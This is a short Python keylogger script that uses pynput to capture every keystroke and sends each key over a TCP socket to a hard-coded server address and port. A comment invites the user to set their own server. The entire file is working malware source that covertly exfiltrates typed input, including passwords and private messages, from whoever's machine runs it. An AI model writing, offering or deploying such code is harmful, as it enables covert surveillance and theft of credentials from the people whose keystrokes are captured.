import pynput
import socket

IP_ADDRESS =  "192.168.10.4" 
port_no = 8080  

def send_data(data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP_ADDRESS, port_no))  # Change to your server's IP and port
        s.sendall(data.encode('utf-8'))
        s.close()
    except Exception as e:
        print(f"Error sending data: {e}")

def ON_PRESS(key):
    try:
        send_data(f"[KEY] {key.char}")
    except AttributeError:
        send_data(f"[SPECIAL] {key}")


with pynput.keyboard.Listener(on_press=ON_PRESS) as listener:
    listener.join()